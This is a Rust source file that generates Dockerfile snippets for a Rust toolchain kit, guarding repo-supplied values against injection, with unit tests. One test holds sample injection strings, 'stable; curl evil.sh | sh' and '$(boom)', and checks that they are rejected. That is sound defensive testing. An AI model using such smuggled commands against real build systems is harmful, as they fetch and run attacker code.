//! Toolchain kits: Dockerfile snippets layered on the base image, picked from the
//! files in the project, plus the caches that make repeat runs fast.

use std::path::Path;

use anyhow::{Result, bail};

pub const KIT_NAMES: [&str; 1] = ["rust"];

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Kit {
    pub name: &'static str,
    /// Human-readable version, shown in the launch summary.
    pub version: String,
    /// Dockerfile lines appended after `FROM <base>`.
    pub dockerfile: String,
    /// Host-backed caches mounted into the box, as (cache name, box path).
    pub caches: Vec<(&'static str, &'static str)>,
    /// Project-relative dirs replaced by a box-only cache, so Linux build output never
    /// mixes with the host's.
    pub artifacts: Vec<&'static str>,
}

impl Kit {
    pub fn label(&self) -> String {
        format!("{} {}", self.name, self.version)
    }
}

/// Which kits to use: explicit `--kit` values win over detection; `--kit none` disables both.
pub fn resolve(root: &Path, requested: &[String]) -> Result<Vec<Kit>> {
    if requested.iter().any(|k| k == "none") {
        if requested.len() > 1 {
            bail!("--kit none can't be combined with other kits");
        }
        return Ok(vec![]);
    }
    if requested.is_empty() {
        return Ok(detect(root));
    }
    let mut kits = Vec::new();
    for name in requested {
        match name.as_str() {
            "rust" => kits.push(rust(root)),
            other => bail!(
                "unknown kit `{other}` (available: {}, or none)",
                KIT_NAMES.join(", ")
            ),
        }
    }
    kits.dedup_by_key(|k| k.name);
    Ok(kits)
}

pub fn detect(root: &Path) -> Vec<Kit> {
    let mut kits = Vec::new();
    if root.join("Cargo.toml").is_file() {
        kits.push(rust(root));
    }
    kits
}

#[derive(Debug, Default, PartialEq, Eq)]
struct RustToolchain {
    channel: Option<String>,
    components: Vec<String>,
    targets: Vec<String>,
}

fn rust(root: &Path) -> Kit {
    let pin = read_rust_toolchain(root);
    let channel = pin.channel.unwrap_or_else(|| "stable".into());
    let mut components = vec!["clippy".to_string(), "rustfmt".to_string()];
    for c in pin.components {
        if !components.contains(&c) {
            components.push(c);
        }
    }
    let targets = if pin.targets.is_empty() {
        String::new()
    } else {
        format!(" --target {}", pin.targets.join(","))
    };
    // Toolchains live in the image; the box runs as the host UID, so make them writable
    // for rustup's own bookkeeping. Writes land in the disposable container layer.
    let dockerfile = format!(
        "ENV RUSTUP_HOME=/usr/local/rustup CARGO_HOME=/usr/local/cargo PATH=/usr/local/cargo/bin:$PATH\n\
         RUN curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs \\\n \
         | sh -s -- -y --no-modify-path --profile minimal --default-toolchain {channel} \
         --component {components}{targets} \\\n \
         && chmod -R a+rwX /usr/local/rustup /usr/local/cargo\n",
        components = components.join(","),
    );
    Kit {
        name: "rust",
        version: channel,
        dockerfile,
        caches: vec![
            ("cargo-registry", "/usr/local/cargo/registry"),
            ("cargo-git", "/usr/local/cargo/git"),
        ],
        artifacts: vec!["target"],
    }
}

/// Reads `rust-toolchain.toml`, or the legacy `rust-toolchain` file holding just a channel.
fn read_rust_toolchain(root: &Path) -> RustToolchain {
    if let Ok(text) = std::fs::read_to_string(root.join("rust-toolchain.toml")) {
        return parse_rust_toolchain_toml(&text);
    }
    if let Ok(text) = std::fs::read_to_string(root.join("rust-toolchain")) {
        let text = text.trim();
        if text.starts_with('[') {
            return parse_rust_toolchain_toml(text);
        }
        if !text.is_empty() {
            return RustToolchain {
                channel: Some(text.to_string()),
                ..Default::default()
            };
        }
    }
    RustToolchain::default()
}

fn parse_rust_toolchain_toml(text: &str) -> RustToolchain {
    let Ok(value) = text.parse::<toml::Table>() else {
        return RustToolchain::default();
    };
    let Some(toolchain) = value.get("toolchain").and_then(|t| t.as_table()) else {
        return RustToolchain::default();
    };
    let list = |key: &str| -> Vec<String> {
        toolchain
            .get(key)
            .and_then(|v| v.as_array())
            .map(|a| {
                a.iter()
                    .filter_map(|v| v.as_str())
                    .filter(|s| is_safe_token(s))
                    .map(String::from)
                    .collect()
            })
            .unwrap_or_default()
    };
    RustToolchain {
        channel: toolchain
            .get("channel")
            .and_then(|v| v.as_str())
            .filter(|s| is_safe_token(s))
            .map(String::from),
        components: list("components"),
        targets: list("targets"),
    }
}

/// Values from the repo end up in a Dockerfile `RUN` line, so only allow the
/// characters real channels, components and targets use.
fn is_safe_token(s: &str) -> bool {
    !s.is_empty()
        && s.len() <= 64
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || "-_.".contains(c))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn tempdir(name: &str) -> std::path::PathBuf {
        let dir = std::env::temp_dir().join(format!("sandbox-kits-{name}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    #[test]
    fn detects_rust_from_cargo_toml() {
        let dir = tempdir("detect");
        assert!(detect(&dir).is_empty());
        std::fs::write(dir.join("Cargo.toml"), "[package]\nname = \"x\"\n").unwrap();
        let kits = detect(&dir);
        assert_eq!(kits.len(), 1);
        assert_eq!(kits[0].label(), "rust stable");
        assert_eq!(kits[0].artifacts, ["target"]);
    }

    #[test]
    fn honours_rust_toolchain_pin() {
        let dir = tempdir("pin");
        std::fs::write(dir.join("Cargo.toml"), "").unwrap();
        std::fs::write(
            dir.join("rust-toolchain.toml"),
            "[toolchain]\nchannel = \"1.89.0\"\ncomponents = [\"rust-src\", \"clippy\"]\ntargets = [\"wasm32-unknown-unknown\"]\n",
        )
        .unwrap();
        let kit = &detect(&dir)[0];
        assert_eq!(kit.version, "1.89.0");
        assert!(kit.dockerfile.contains("--default-toolchain 1.89.0"));
        assert!(
            kit.dockerfile
                .contains("--component clippy,rustfmt,rust-src")
        );
        assert!(kit.dockerfile.contains("--target wasm32-unknown-unknown"));
    }

    #[test]
    fn legacy_rust_toolchain_file() {
        let dir = tempdir("legacy");
        std::fs::write(dir.join("rust-toolchain"), "nightly-2026-01-01\n").unwrap();
        assert_eq!(
            read_rust_toolchain(&dir).channel.as_deref(),
            Some("nightly-2026-01-01")
        );
    }

    #[test]
    fn rejects_injection_from_repo_files() {
        let pin = parse_rust_toolchain_toml(
            "[toolchain]\nchannel = \"stable; curl evil.sh | sh\"\ncomponents = [\"ok\", \"$(boom)\"]\n",
        );
        assert_eq!(pin.channel, None);
        assert_eq!(pin.components, ["ok"]);
    }

    #[test]
    fn explicit_kits_override_detection() {
        let dir = tempdir("resolve");
        std::fs::write(dir.join("Cargo.toml"), "").unwrap();
        assert!(resolve(&dir, &["none".into()]).unwrap().is_empty());
        assert_eq!(
            resolve(&tempdir("empty"), &["rust".into()]).unwrap().len(),
            1
        );
        assert!(resolve(&dir, &["cobol".into()]).is_err());
        assert!(resolve(&dir, &["none".into(), "rust".into()]).is_err());
    }
}
